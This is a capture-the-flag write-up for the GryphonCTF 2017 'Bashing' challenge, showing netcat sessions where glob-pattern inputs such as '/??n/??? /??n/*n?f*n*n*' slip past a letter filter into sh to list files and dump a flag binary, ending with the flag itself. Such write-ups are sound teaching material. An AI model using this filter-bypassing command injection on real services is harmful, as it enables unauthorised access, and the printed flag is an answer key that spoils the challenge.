# GryphonCTF_2017: Bashing

**Category:** Pwn
**Points:** 150
**Description:**

>You are not yourself when you are hungry. Have a CTF challenge and stop bashing people up.
`nc pwn1.chal.gryphonctf.com 17345`
_Creator - @Platy_

**Hint:**

>I hate needles

## Write-up
This challenge was not an easy one, it's tricky, tough and something even seniors will have trouble in, due to the slightly blackbox nature. For the most part, solving this requires in-depth knowledge of Linux argument handling and common Linux utilities. Also included, bash globbing.

From the start, you are given hints that `sh` might be used as an interpreter,

    # nc pwn1.chal.gryphonctf.com 17345
    I am a [p]erson, [h]ungry > h
    Foods available
    [n]achos
    [f]ishies
    > n
      _   _            _               
     | \ | |          | |              
     |  \| | __ _  ___| |__   ___  ___ 
     | . ` |/ _` |/ __| '_ \ / _ \/ __|
     | |\  | (_| | (__| | | | (_) \__ \
     |_| \_|\__,_|\___|_| |_|\___/|___/

    Hope you enjoy!
    sh: 1: n: not found

However, entering any other value other than `n` or `f` appears to give us an error,

    # nc pwn1.chal.gryphonctf.com 17345
    I am a [p]erson, [h]ungry > h
    Foods available
    [n]achos
    [f]ishies
    > s
    Sorry, but we do not serve these here. Maybe next time!

This however, doesn't seem to apply to symbols...

    # nc pwn1.chal.gryphonctf.com 17345
    I am a [p]erson, [h]ungry > h
    Foods available
    [n]achos
    [f]ishies
    > n*

    Hope you enjoy!
    sh: 1: n*: not found

Let's see if we can find the flag using `/usr/bin/find`

    # nc pwn1.chal.gryphonctf.com 17345
    I am a [p]erson, [h]ungry > h
    Foods available
    [n]achos
    [f]ishies
    > /???/??n/f?n? /

    ...
    /bin/touch
    /bin/mv
    /bin/tar
    /bin/thisisareallylongflagbutifyoucansomehowcatthisitwouldbeamazing
    /dev
    /dev/console
    /dev/core
    ...

Oh look, let's try to cat it.

    # nc pwn1.chal.gryphonctf.com 17345
    I am a [p]erson, [h]ungry > h
    Foods available
    [n]achos
    [f]ishies
    > /??n/??? /??n/*n?f*n*n*
    ...
    (gdb) disas main
    Dump of assembler code for function main:
       0x00000000000006b0 <+0>: push   rbp
       0x00000000000006b1 <+1>: mov    rbp,rsp
       0x00000000000006b4 <+4>: push   0x7d
       0x00000000000006b6 <+6>: push   0x68
       0x00000000000006b8 <+8>: push   0x37
       0x00000000000006ba <+10>:    push   0x6c
       0x00000000000006bc <+12>:    push   0x34
       0x00000000000006be <+14>:    push   0x33
       0x00000000000006c0 <+16>:    push   0x68
       0x00000000000006c2 <+18>:    push   0x5f
       0x00000000000006c4 <+20>:    push   0x72
       0x00000000000006c6 <+22>:    push   0x30
       0x00000000000006c8 <+24>:    push   0x66
       0x00000000000006ca <+26>:    push   0x5f
       0x00000000000006cc <+28>:    push   0x64
       0x00000000000006ce <+30>:    push   0x34
       0x00000000000006d0 <+32>:    push   0x62
       0x00000000000006d2 <+34>:    push   0x5f
       0x00000000000006d4 <+36>:    push   0x35
       0x00000000000006d6 <+38>:    push   0x31
       0x00000000000006d8 <+40>:    push   0x5f
       0x00000000000006da <+42>:    push   0x36
       0x00000000000006dc <+44>:    push   0x6e
       0x00000000000006de <+46>:    push   0x31
       0x00000000000006e0 <+48>:    push   0x68
       0x00000000000006e2 <+50>:    push   0x35
       0x00000000000006e4 <+52>:    push   0x34
       0x00000000000006e6 <+54>:    push   0x62
       0x00000000000006e8 <+56>:    mov    r9d,0x7b
       0x00000000000006ee <+62>:    mov    r8d,0x46
       0x00000000000006f4 <+68>:    mov    ecx,0x54
       0x00000000000006f9 <+73>:    mov    edx,0x43
       0x00000000000006fe <+78>:    mov    esi,0x47
       0x0000000000000703 <+83>:    lea    rdi,[rip+0xae]        # 0x7b8
       0x000000000000070a <+90>:    mov    eax,0x0
       0x000000000000070f <+95>:    call   0x560 <printf@plt>
       0x0000000000000714 <+100>:   add    rsp,0xd0
       0x000000000000071b <+107>:   mov    eax,0x0
       0x0000000000000720 <+112>:   leave  
       0x0000000000000721 <+113>:   ret    
    End of assembler dump.

Interesting assembly dump. Piecing all the values also happen to give us the flag!

Well, this was not the intended way to solve it. The intended way to solve it was to make use of bash functions and the amazing `printf` function to build us a "command prompt", if you will.

Original intended solution, in [Python](solve.py).

    # ./solve.py 
    [+] Opening connection to pwn1.chal.gryphonctf.com on port 17345: Done
    [+] Cracking the Da Vinci Code...: GCTF{b45h1n6_15_b4d_f0r_h34l7h}
    [*] Closed connection to pwn1.chal.gryphonctf.com port 17345

Therefore, the flag is `GCTF{b45h1n6_15_b4d_f0r_h34l7h}`.
